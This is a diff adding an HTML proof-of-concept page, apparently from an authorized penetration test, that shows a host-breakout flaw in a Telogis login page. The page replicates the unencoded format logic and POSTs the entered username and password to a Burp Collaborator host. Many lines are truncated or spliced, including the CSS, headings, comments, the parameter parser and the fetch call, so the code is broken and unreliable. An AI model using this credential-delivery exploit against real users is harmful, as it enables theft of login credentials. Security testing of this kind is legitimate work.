@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FND-001 PoC — credential-delivery leg (authorized pentest)</title>
+<style>
+  body { font: 15px/1.5 system-ui, sans-serif; max-width: 640px; margin: 40px auto; padding: 0 16px; }
+  h1 { font-size: 18px; }
+  label { display:block; margin: 12px 0 4px; font-weight:600; }
+  input { width:100%; padding:8px; box-sizing:border-box; font-size:15px; }
+  button { margin-top:16px; padding:10px 18pnter; }
+  #log { margin-top:24px; padding:12px; background:#f4f4f4; border:1px solid #ccc;
+         white-space:pre-wrap; word-break:brace; }
+  .note { color:#555; font-size:13px; }
+</style>
+</head>
+<body>
+
+<h1>Telogis FND-001 — credential-delivery pr
+<p class="note">
+  This page reproduces the request the vulnerable Telogis login SPA fires. It sends the
+  form-urlencoded credential POST to the conurp Collaborator),
+  exactly as the real page would send it to <code>login-verizon-sso.com</code> after the
+  host-breakout. Use only a <strong>test password</strong> you type yourself.
+</p>
+
+<!-- CONFIG: your attacker host stand-in (Buour payload rotates. -->
+<script>
+  var COLLAB_HOST = "4inwvm3z23n7o538gjpn9qgz0q6hu7iw.oastify.com";
+</script>
+
+<label for="username">Username (tenant:user)/label>
+<input id="username" type="text" autocomplete="off">
+
+<label for="password">Password (TEST value o
+<input id="password" type="password" autocomplete="off">
+
+<button id="signin">Sign In</button>
+
+<div id="log">Ready. Configured attacker host: <span id="host"></span></div>
+
+<script>
+// --- Faithful replica of the vulnerable page logic (login.js / common.js / session.js) ---
+
+// common.js:2  String.prototype.format — bare {0} replace, NO encoding (the root cause)
+String.prototype.format = function () {
+  var args = arguments;
+  return this.replace(/\{(\d+)\}/g, function (m, i) { return args[i]; });
+};
+
+// session.js:1  publicPattern on the real page is "https://login-{0}.platform.telogis.com".
+// For this delivery proof we point it at th lands on a host
+// you control. In a real attack this stays the real pattern and the attacker registers
+// login-<label>.com; the breakout math is shown in the log below either way.
+var sessionObject = {
+  publicPattern: "https://login-{0}.platform.telogis.com" // real value, used only to DISPLAY the breakout
+};
+
+// login.js:413  calculateLoginDestination() — verbatim shape
+function calculateLoginDestination() {
+  var user = document.getElementById('userna
+  var loginPrefix = ""; // relative fallback on the real page
+  if (user && user.indexOf(':') !== -1 && sessionObject && sessionObject.publicPattern) {
+    var customer = user.split(':')[0];      rbatim
+    loginPrefix = sessionObject.publicPattern.format(customer); // no encoding
+  }
+  return loginPrefix + '/login/ajax';
+}
+
+// common.js:105 getParams() — splits on &/=IM (no decode).
+out[pair.slice(0, i)] = pair.slice(i + 1); // NOT decodeURIComponent — verbatim
+  });
+  return out;
+}
+
+// login.js:236 setupLogin() — prefill #username from ?username=
+(function setupLogin() {
+  var p = getParams();
+  if (p.username) document.getElementById('username').value = p.username;
+  document.getElementById('host').textContent = COLLAB_HOST;
+})();
+
+function logline(s) {
+  var el = document.getElementById('log');
+  el.textContent += "\n" + s;
+}
+
+
+  // Show the real breakout the Telogis page would compute for this username:
+  var realDest = calculateLoginDestination();
+  var realHost;
+  try { realHost = new URL(realDest).host; } catch (e) { realHost = "(relative fallback)"; }
+  logline("real Telogis destination : " + realDest);
+  logline("real effective POST host : " + realHost + "   (attacker-registerable)");
+
+  // Deliver the identical request shape to the Collaborator (attacker-host stand-in):
+  var dest = "https://" + COLLAB_HOST + "/login/ajax";
+  var body = "username=" + encodeURIComponen
+             "&password=" + encodeURIComponent(p) +
+             "&loginTime=" + encodeURIComponent(new Date().toUTCString()) +
+             "&autologin=false";
+
+method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, // ONLY safelisted header => no preflight
+    body: body,
+    credentials: 'include'   // mirrors withCredentials:true
+  })
+  .then(function () {
+    logline("request sent. (response readable => attacker host echoed CORS; not required)");
+  })
+  .catch(function () {
+    // Expected: the browser blocks READING
+    // The request itself (and the password body) still left the browser and reached the host.
+    logline("request sent. response READ blocked by CORS (expected) — body still delivered.");
+    logline(">> Now check Burp Collaborator: one POST to /login/ajax with the credentials, and");
+    logline(">> NO preceding OPTIONS preflight. That absence is the proof.");
+  });
+});
+</script>
+
+</body>
